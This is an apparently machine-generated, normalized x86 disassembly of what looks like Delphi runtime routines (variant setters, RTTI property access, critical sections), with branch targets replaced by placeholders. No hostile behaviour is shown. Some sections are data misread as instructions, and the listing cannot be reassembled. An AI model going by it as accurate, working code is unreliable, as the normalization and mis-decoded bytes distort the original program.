movsx eax bl
movzx eax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4158e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415904
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_4115c0
sub_415924
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415944
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415964
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_4115c0
sub_415984
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_4159a4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_4115c0
sub_4159d0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4115c0
sub_4159f4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_4115c0
sub_415a20
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_4115c0
sub_415a4c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_4115c0
sub_415a78
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_4115c0
sub_415adc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415b08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_405f58
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415b40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_407024
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415b6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_407024
pop esi
pop ebx
retn
mov eax ebx
call sub_4115c0
sub_415d1c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_415e42
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_405584
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_416178
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_405584
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_405864
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_409e84
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_405864
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404530
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_403098
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_405794
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415e49
lea eax [ ebp - 0x208 ]
call sub_405530
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_405864
sub_415ec4
[ eax ]
or [ ecx ] eax
or [ esi + 0x61 ] dl
jb r-xdata
out dx al
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
movzx eax [ esi ]
call sub_416178
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4160f8
movzx eax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_415ed4
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_415f35
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_40676c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f3c
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_404650
sub_415f84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4160f8
lea edx [ ebp - 0x8 ]
movzx eax [ esi ]
call sub_416178
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_415fd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
movzx eax [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
movzx eax [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416010
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4160f8
movzx eax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41604c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404a1c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4160af
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4160b6
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_416150
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_416178
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_416220
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40676c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_416234
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41630a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4162ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_406774
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4162f4
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_404530
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_405794
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_409a84
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_41632c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41639b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163a2
retn
call sub_415ed4
push rw-data
call DeleteCriticalSection
mov eax rw-data
call sub_411650
mov eax rw-data
call sub_405530
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_4060f8
mov eax rw-data
mov edx [ r-xdata ]
call sub_406934
sub_4164f4
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_416540
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4164e8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_409edc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4164f4
mov edx [ rw-data ]
mov eax esi
call sub_409a84
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_409a84
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409edc
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4165a4
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_416614
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_416688
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4166e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416773
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4164e8
mov esi [ eax + 0x1 ]
movzx eax [ ebx ]
dec al
je r-xdata
mov eax edi
call sub_409edc
mov ebx eax
sub ebx esi
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41677a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov ebx edi
test ebx ebx
je r-xdata
sub al 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x2
mov eax edi
call sub_405a44
mov eax [ ebp - 0x4 ]
call sub_409edc
mov ebx eax
sub ebx esi
jmp r-xdata
sub ebx 0x4
mov ebx [ ebx ]
jmp r-xdata
mov edx edi
mov eax ebx
call sub_416540
mov ebx eax
sub_416784
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4167d8
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4057e8
mov ecx esp
mov edx esi
mov eax ebx
call sub_416784
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_416820
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_41680c
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416860
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4168a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_405ea8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4168e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4168af
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
sub_4168b8
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
movzx ebx [ ebx ]
sub bl 0x5
je r-xdata
call sub_4167d8
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_416820
pop ebx
retn
dec bl
je r-xdata
call sub_416860
jmp r-xdata
pop ebx
retn
sub_4168e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4169af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4057d4
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_4168b8
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169b6
lea eax [ ebp - 0xc ]
call sub_405530
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_405d64
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4169c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4164e8
movzx eax [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_416a09 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_416b38 ]
jmp [ eax * 4 + jump_table_416aa5 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_416bcc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_416bb8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416c0c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_416c44
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_416c80
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_407024
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_416cf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_416d3a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d41
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4060f8
mov eax rw-data
call sub_405530
sub_417814
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jl r-xdata
outsb
dec ecx
je r-xdata
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cmp [ eax + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jns r-xdata
inc ecx
add al dh
mov dl 0x41
add [ ebx + esi * 4 ] ah
inc ecx
add [ eax ] ch
mov bl 0x41
add [ ebx + esi * 4 ] ch
mov [ 0xffffffffa2540041 ] eax
inc ecx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc ecx
add [ esi + 0x41 ] ah
add [ esp + esi * 4 - 0x4affffbf ] ah
inc ecx
sub al 0xb3
add [ eax ] bh
add [ eax ] al
add ah bh
jbe r-xdata
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax - 0x49 ] cl
inc ecx
imul ebp [ esi + 0x67 ] 0x7473694c
sub [ ecx + 0x41 ] bh
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add ah dl
mov ch 0x41
add [ ebp * 4 - 0x49efffbf ] dh
inc ecx
add [ eax - 0x6bffbe4a ] dl
mov al 0x41
add [ eax + esi * 4 - 0x5e63ffbf ] ah
inc ecx
add [ eax - 0x4f ] al
inc ecx
add [ eax - 0x13ffbe4f ] al
mov cl 0x41
add [ eax ] dl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax + 0x280041b3 ] cl
test al 0x41
add ah bh
test al 0x41
add ah al
mov bl 0x41
add ah dl
mov bl 0x41
add [ eax - 0x57 ] ah
inc ecx
add [ ecx + ebp * 4 - 0x559fffbf ] dh
inc ecx
add ah dh
stosd [ edi ]
inc ecx
add [ esp + ebp * 4 + 0x41 ] cl
add ah ah
